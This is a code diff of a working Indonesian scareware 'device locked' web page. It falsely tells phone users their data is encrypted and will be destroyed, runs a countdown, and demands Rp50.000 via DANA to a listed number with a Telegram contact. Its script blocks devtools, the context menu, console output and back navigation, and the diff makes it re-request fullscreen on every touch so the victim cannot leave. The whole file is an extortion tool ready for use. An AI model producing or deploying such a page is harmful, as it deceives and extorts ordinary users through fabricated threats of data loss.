@@ -3,47 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0">
-    <title>XINN SYSTEM - DEVICE LOCKED</title>
+    <title>⚠️ XINN SYSTEM - DEVICE LOCKED</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root { --pink: #ff2d78; --purple: #b300ff; --cyan: #00ffff; --green: #00ff88; }
         body {
             background: #0a0005;
             font-family: 'Share Tech Mono', monospace;
             color: #fff;
             overflow: hidden;
-            height: 100vh;
-            width: 100vw;
+            height: 100vh; width: 100vw;
             user-select: none;
             -webkit-user-select: none;
-            -webkit-tap-highlight-color: transparent;
             position: fixed;
             top: 0; left: 0;
         }
-        #matrixCanvas {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            z-index: 0;
-            opacity: 0.45;
-        }
+        #matrixCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.45; }
         .overlay {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             z-index: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 15px;
-            overflow-y: auto;
+            display: flex; justify-content: center; align-items: center;
+            padding: 15px; overflow-y: auto;
         }
         .container {
-            max-width: 480px;
-            width: 100%;
+            max-width: 480px; width: 100%;
             background: rgba(10,0,5,0.92);
             backdrop-filter: blur(25px);
-            border: 2px solid #ff2d78;
+            border: 2px solid var(--pink);
             border-radius: 20px;
             padding: 25px 20px;
             box-shadow: 0 0 30px rgba(255,45,120,0.5), 0 0 60px rgba(179,0,255,0.3);
@@ -55,133 +42,57 @@
             100% { border-color: #b300ff; }
         }
         .glitch-title {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.2rem;
-            font-weight: 900;
-            color: #ff2d78;
-            text-shadow: 0 0 10px #ff2d78, 0 0 40px #b300ff;
-            text-align: center;
-            letter-spacing: 3px;
+            font-family: 'Orbitron', sans-serif; font-size: 2.2rem; font-weight: 900;
+            color: #ff2d78; text-shadow: 0 0 10px #ff2d78, 0 0 40px #b300ff;
+            text-align: center; letter-spacing: 3px;
             animation: glitch 0.8s infinite;
         }
         @keyframes glitch {
-            0%,100% { transform: translate(0); }
-            20% { transform: translate(-3px,3px); }
-            40% { transform: translate(3px,-3px); }
-            60% { transform: translate(-3px,-3px); }
-            80% { transform: translate(3px,3px); }
+            0%,100%{transform:translate(0)} 20%{transform:translate(-3px,3px)}
+            40%{transform:translate(3px,-3px)} 60%{transform:translate(-3px,-3px)} 80%{transform:translate(3px,3px)}
         }
-        .subtitle {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.9rem;
-            color: #ff69b4;
-            text-align: center;
-            margin: 5px 0 20px;
-            text-shadow: 0 0 10px #ff69b4;
-        }
+        .subtitle { text-align: center; color: #ff69b4; font-family: 'Orbitron', sans-serif; font-size: 0.9rem; margin: 5px 0 20px; text-shadow: 0 0 10px #ff69b4; }
         .warning-box {
-            background: rgba(255,0,64,0.15);
-            border: 1.5px solid #ff0040;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-            animation: pulse 1.5s ease-in-out infinite;
+            background: rgba(255,0,64,0.15); border: 1.5px solid #ff0040; border-radius: 12px;
+            padding: 15px; margin: 20px 0; text-align: center; animation: pulse 1.5s ease-in-out infinite;
         }
-        @keyframes pulse {
-            0%,100% { box-shadow: 0 0 5px rgba(255,0,64,0.3); }
-            50% { box-shadow: 0 0 35px rgba(255,0,64,0.8); }
-        }
-        .warning-text {
-            color: #ff4444;
-            font-weight: bold;
-            font-size: 0.85rem;
-            line-height: 1.6;
-        }
-        .target-number {
-            color: #00ffff;
-            font-size: 1rem;
-            margin-top: 8px;
-            text-shadow: 0 0 10px #00ffff;
-        }
+        @keyframes pulse { 0%,100%{box-shadow:0 0 5px rgba(255,0,64,0.3)} 50%{box-shadow:0 0 35px rgba(255,0,64,0.8)} }
+        .warning-text { color: #ff4444; font-weight: bold; font-size: 0.85rem; line-height: 1.6; }
+        .target-number { color: #00ffff; font-size: 1rem; margin-top: 8px; text-shadow: 0 0 10px #00ffff; }
         .timer-box { text-align: center; margin: 20px 0; }
         .timer-label { color: #00ffff; font-size: 0.75rem; letter-spacing: 3px; }
         .timer {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 2.5rem;
-            color: #00ffff;
-            text-shadow: 0 0 20px #00ffff;
-            font-weight: 900;
-            margin: 8px 0;
+            font-family: 'Orbitron', sans-serif; font-size: 2.5rem; color: #00ffff;
+            text-shadow: 0 0 20px #00ffff; font-weight: 900; margin: 8px 0;
         }
         .timer.warning { color: #ff0000; text-shadow: 0 0 30px #ff0000; animation: pulse 0.5s infinite; }
-        .payment-section {
-            background: rgba(0,0,0,0.5);
-            border: 1px solid #b300ff;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-        }
-        .payment-number {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.5rem;
-            color: #00ff88;
-            text-shadow: 0 0 15px #00ff88;
-        }
+        .payment-section { background: rgba(0,0,0,0.5); border: 1px solid #b300ff; border-radius: 12px; padding: 15px; margin: 20px 0; text-align: center; }
+        .payment-number { font-family: 'Orbitron', sans-serif; font-size: 1.5rem; color: #00ff88; text-shadow: 0 0 15px #00ff88; }
         .telegram-contact { color: #00ffff; font-size: 0.85rem; margin-top: 10px; }
         .pin-section { margin: 25px 0; }
         .pin-label { text-align: center; font-size: 0.9rem; letter-spacing: 3px; color: #00ffff; margin-bottom: 15px; }
         .pin-container { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
         .pin-input {
-            width: 48px; height: 60px;
-            background: rgba(0,0,0,0.7);
-            border: 2px solid #ff2d78;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 1.8rem;
-            color: #ff69b4;
-            font-family: 'Orbitron', sans-serif;
-            font-weight: 700;
-            text-shadow: 0 0 15px #ff69b4;
-            outline: none;
-            text-transform: uppercase;
+            width: 48px; height: 60px; background: rgba(0,0,0,0.7);
+            border: 2px solid #ff2d78; border-radius: 12px; text-align: center;
+            font-size: 1.8rem; color: #ff69b4; font-family: 'Orbitron', sans-serif;
+            font-weight: 700; text-shadow: 0 0 15px #ff69b4; outline: none; text-transform: uppercase;
         }
         .pin-input:focus { border-color: #00ffff; box-shadow: 0 0 25px rgba(0,255,255,0.5); }
         .btn-unlock {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background: linear-gradient(135deg, #ff2d78, #b300ff);
-            border: none;
-            border-radius: 50px;
-            color: #fff;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 1.1rem;
-            font-weight: 700;
-            letter-spacing: 3px;
-            cursor: pointer;
-            box-shadow: 0 0 30px rgba(255,45,120,0.7);
-            margin-top: 15px;
+            display: block; width: 100%; padding: 15px;
+            background: linear-gradient(135deg, #ff2d78, #b300ff); border: none; border-radius: 50px;
+            color: #fff; font-family: 'Orbitron', sans-serif; font-size: 1.1rem; font-weight: 700;
+            letter-spacing: 3px; cursor: pointer; box-shadow: 0 0 30px rgba(255,45,120,0.7); margin-top: 15px;
         }
         .btn-unlock:active { transform: scale(0.97); }
         .footer-tag { text-align: center; font-size: 0.7rem; color: #b300ff; margin-top: 15px; }
         .toast {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%) translateY(100px);
-            background: rgba(0,0,0,0.95);
-            color: #fff;
-            padding: 15px 30px;
-            border-radius: 50px;
-            z-index: 1000;
-            font-family: 'Orbitron', sans-serif;
-            font-size: 0.85rem;
-            border: 1px solid #ff2d78;
-            box-shadow: 0 0 20px rgba(255,45,120,0.5);
-            transition: transform 0.3s;
-            text-align: center;
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px);
+            background: rgba(0,0,0,0.95); color: #fff; padding: 15px 30px; border-radius: 50px;
+            z-index: 1000; font-family: 'Orbitron', sans-serif; font-size: 0.85rem;
+            border: 1px solid #ff2d78; box-shadow: 0 0 20px rgba(255,45,120,0.5);
+            transition: transform 0.3s; text-align: center;
         }
         .toast.show { transform: translateX(-50%) translateY(0); }
         @media (max-width: 480px) {
@@ -201,48 +112,43 @@
         <p class="subtitle">BY XINN IMUT 😈🌸</p>
 
         <div class="warning-box">
-            <p class="warning-text">
-                PERINGATAN!! DATA ANDA TELAH DIENKRIPSI!<br>
-                JANGAN RESTART HP ANDA!<br>
-                SEMUA DATA AKAN HILANG PERMANEN! 😭
-            </p>
-            <p class="target-number" id="targetDisplay">NOMOR: -</p>
+            <p class="warning-text">⚠️ PERINGATAN!! DATA ANDA TELAH DIENKRIPSI!<br>JANGAN RESTART HP ANDA!<br>SEMUA DATA AKAN HILANG PERMANEN! 😭</p>
+            <p class="target-number" id="targetDisplay">📱 NOMOR: -</p>
         </div>
 
         <div class="timer-box">
-            <p class="timer-label">WAKTU TERSISA</p>
+            <p class="timer-label">⏳ WAKTU TERSISA</p>
             <p class="timer" id="timer">23:59:59</p>
         </div>
 
         <div class="payment-section">
-            <p style="color:#ff69b4; margin-bottom:8px;">TRANSFER KE DANA:</p>
-            <p style="color:#fff; font-size:1.3rem; font-weight:bold;">Rp50.000</p>
+            <p style="color:#ff69b4;margin-bottom:8px;">💸 TRANSFER KE DANA:</p>
+            <p style="color:#fff;font-size:1.3rem;font-weight:bold;">Rp50.000</p>
             <p class="payment-number" id="danaDisplay">-</p>
-            <p class="telegram-contact" id="teleDisplay">SUDAH TRANSFER? CHAT: -</p>
+            <p class="telegram-contact" id="teleDisplay">📞 SUDAH TRANSFER? CHAT: -</p>
         </div>
 
         <div class="pin-section">
-            <p class="pin-label">MASUKKAN PIN UNLOCK</p>
-            <div class="pin-container">
-                <input type="text" class="pin-input" maxlength="1" id="p1" inputmode="text" autocomplete="off">
-                <input type="text" class="pin-input" maxlength="1" id="p2" inputmode="text" autocomplete="off">
-                <input type="text" class="pin-input" maxlength="1" id="p3" inputmode="text" autocomplete="off">
-                <input type="text" class="pin-input" maxlength="1" id="p4" inputmode="text" autocomplete="off">
-                <input type="text" class="pin-input" maxlength="1" id="p5" inputmode="text" autocomplete="off">
-                <input type="text" class="pin-input" maxlength="1" id="p6" inputmode="text" autocomplete="off">
+            <p class="pin-label">🔐 MASUKKAN PIN UNLOCK</p>
+            <div class="pin-container" id="pinContainer">
+                <input type="text" class="pin-input" maxlength="1" id="p1" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
+                <input type="text" class="pin-input" maxlength="1" id="p2" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
+                <input type="text" class="pin-input" maxlength="1" id="p3" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
+                <input type="text" class="pin-input" maxlength="1" id="p4" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
+                <input type="text" class="pin-input" maxlength="1" id="p5" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
+                <input type="text" class="pin-input" maxlength="1" id="p6" inputmode="text" autocomplete="off" autocorrect="off" spellcheck="false">
             </div>
         </div>
 
-        <button class="btn-unlock" onclick="checkPIN()">UNLOCK</button>
-
-        <p class="footer-tag">#XinnIsHere | XINN SYSTEM v3.0</p>
+        <button class="btn-unlock" onclick="checkPIN()">🔓 UNLOCK</button>
+        <p class="footer-tag">#XinnIsHere ❤️ | XINN SYSTEM v3.0</p>
     </div>
 </div>
 
 <div class="toast" id="toast"></div>
 
 <script>
-// ========== DEKRIPSI URL PARAMETER ==========
+// ========== DEKRIPSI URL ==========
 function decryptData(encBase64) {
     try {
         const decoded = atob(encBase64);
@@ -262,7 +168,7 @@ const urlParams = new URLSearchParams(window.location.search);
 const encData = urlParams.get('d') || '';
 
 let TARGET = 'TIDAK DIKETAHUI';
-let PIN = 'XINNIMUT';
+let PIN = '281029';
 let DANA = '083175050030';
 let TELE = '@xinn_93';
 
@@ -276,17 +182,17 @@ if (encData) {
     }
 }
 
-// ========== UPDATE TAMPILAN ==========
-document.getElementById('targetDisplay').textContent = 'NOMOR: ' + TARGET;
+// Update display
+document.getElementById('targetDisplay').textContent = '📱 NOMOR: ' + TARGET;
 document.getElementById('danaDisplay').textContent = DANA;
-document.getElementById('teleDisplay').textContent = 'SUDAH TRANSFER? CHAT: ' + TELE;
+document.getElementById('teleDisplay').textContent = '📞 SUDAH TRANSFER? CHAT: ' + TELE;
 
 // ========== MATRIX BACKGROUND ==========
 const canvas = document.getElementById('matrixCanvas');
 const ctx = canvas.getContext('2d');
 let w = canvas.width = window.innerWidth;
 let h = canvas.height = window.innerHeight;
-const chars = 'XINNSYSTEM😈🌸';
+const chars = 'XINNSYSTEM😈🌸ｦｧｨｩｪｫｬｭｮｯｰ';
 const drops = [];
 const fontSize = 14;
 const cols = Math.floor(w / fontSize);
@@ -316,7 +222,7 @@ function updateTimer() {
         timerEl.textContent = '00:00:00';
         clearInterval(timerInt);
         document.body.style.background = '#ff0000';
-        setTimeout(() => alert('WAKTU HABIS! DATA DIHANCURKAN!'), 500);
+        setTimeout(() => alert('⏰ WAKTU HABIS! DATA DIHANCURKAN! 💀'), 500);
         return;
     }
     const hh = Math.floor(timeLeft / 3600);
@@ -350,13 +256,13 @@ inputs.forEach((inp, i) => {
 function checkPIN() {
     let entered = '';
     inputs.forEach(i => entered += i.value.toUpperCase());
-    if (entered.length < 6) return showToast('MASUKKAN 6 DIGIT PIN!');
+    if (entered.length < 6) return showToast('❌ MASUKKAN 6 DIGIT PIN!');
     if (entered === PIN) {
         clearInterval(timerInt);
-        document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0005;text-align:center;font-family:'Orbitron',sans-serif;padding:20px;"><div><h1 style="color:#00ff88;font-size:3rem;text-shadow:0 0 30px #00ff88;">TERBUKA!</h1><p style="color:#fff;font-size:1.2rem;margin:20px 0;">SELAMAT! DATA ANDA AMAN.<br>XINN SYSTEM TELAH DINONAKTIFKAN.</p><p style="color:#ff69b4;font-size:1.5rem;">BY XINN IMUT 😈🌸</p></div></div>`;
+        document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0005;text-align:center;font-family:'Orbitron',sans-serif;padding:20px;"><div><h1 style="color:#00ff88;font-size:3rem;text-shadow:0 0 30px #00ff88;">✅ TERBUKA!</h1><p style="color:#fff;font-size:1.2rem;margin:20px 0;">SELAMAT! DATA ANDA AMAN.<br>XINN SYSTEM TELAH DINONAKTIFKAN.</p><p style="color:#ff69b4;font-size:1.5rem;">BY XINN IMUT 😈🌸</p></div></div>`;
         if (navigator.vibrate) navigator.vibrate([200,100,200]);
     } else {
-        showToast('PIN SALAH! COBA LAGI!');
+        showToast('❌ PIN SALAH! COBA LAGI!');
         document.getElementById('mainContainer').style.animation = 'none';
         document.getElementById('mainContainer').offsetHeight;
         document.getElementById('mainContainer').style.animation = 'shake 0.6s ease';
@@ -366,7 +272,6 @@ function checkPIN() {
     }
 }
 
-// ========== TOAST ==========
 function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg;
@@ -378,22 +283,24 @@ function showToast(msg) {
 document.addEventListener('contextmenu', e => e.preventDefault());
 document.addEventListener('keydown', function(e) {
     if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') || (e.ctrlKey && e.key === 'U')) {
-        e.preventDefault();
-        return false;
+        e.preventDefault(); return false;
     }
 });
 console.log = console.warn = console.error = console.clear = function() {};
 history.pushState(null, '', location.href);
-window.onpopstate = function() { history.pushState(null, '', location.href); showToast('TIDAK ADA JALAN KELUAR! BAYAR!'); };
+window.onpopstate = function() { history.pushState(null, '', location.href); showToast('🚫 TIDAK ADA JALAN KELUAR! BAYAR!'); };
 document.addEventListener('dragstart', e => e.preventDefault());
 document.addEventListener('selectstart', e => e.preventDefault());
-
-// ========== INIT ==========
 inputs[0].focus();
-document.addEventListener('click', function reqFS() {
+
+requestFullscreen();
+function requestFullscreen() {
     const el = document.documentElement;
     if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
-}, { once: true });
+}
+// Re-request fullscreen setiap target sentuh layar
+document.addEventListener('click', requestFullscreen);
+document.addEventListener('touchstart', requestFullscreen);
 </script>
 
 </body>
